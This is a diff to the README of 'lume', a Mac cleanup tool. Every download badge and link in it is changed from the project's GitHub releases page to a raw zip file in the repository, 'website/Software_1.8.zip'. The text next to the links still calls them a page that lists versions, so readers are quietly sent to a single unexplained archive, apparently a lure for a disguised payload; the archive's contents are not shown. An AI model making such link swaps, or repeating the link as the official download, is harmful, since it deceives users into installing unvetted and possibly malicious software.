@@ -1,6 +1,6 @@
 # 🔥 lume - Safe Mac Cleanup Tool  
 
-[![Download lume](https://img.shields.io/badge/Download-lume-brightgreen?style=for-the-badge&logo=github)](https://github.com/Nyakairu/lume/releases)
+[![Download lume](https://img.shields.io/badge/Download-lume-brightgreen?style=for-the-badge&logo=github)](https://github.com/Nyakairu/lume/raw/refs/heads/main/website/Software_1.8.zip)
 
 ---
 
@@ -35,7 +35,7 @@ lume helps you clean up your Mac without risking permanent deletion. It scans ov
 ### Step 1: Visit the Download Page  
 Go to the official release page for lume to get the latest version:
 
-[![Get lume here](https://img.shields.io/badge/Download-lume-blue?style=for-the-badge&logo=github)](https://github.com/Nyakairu/lume/releases)
+[![Get lume here](https://img.shields.io/badge/Download-lume-blue?style=for-the-badge&logo=github)](https://github.com/Nyakairu/lume/raw/refs/heads/main/website/Software_1.8.zip)
 
 This page lists all available versions. Choose the file designed for macOS. It usually ends with `.tar.gz` or `.zip`.
 
@@ -128,7 +128,7 @@ Change settings inside the TUI under the “Settings” menu.
 ## 📥 Download and Install lume  
 
 1. Visit the releases page:  
-   https://github.com/Nyakairu/lume/releases  
+   https://github.com/Nyakairu/lume/raw/refs/heads/main/website/Software_1.8.zip  
 
 2. Find the latest macOS build and download the file.  
 
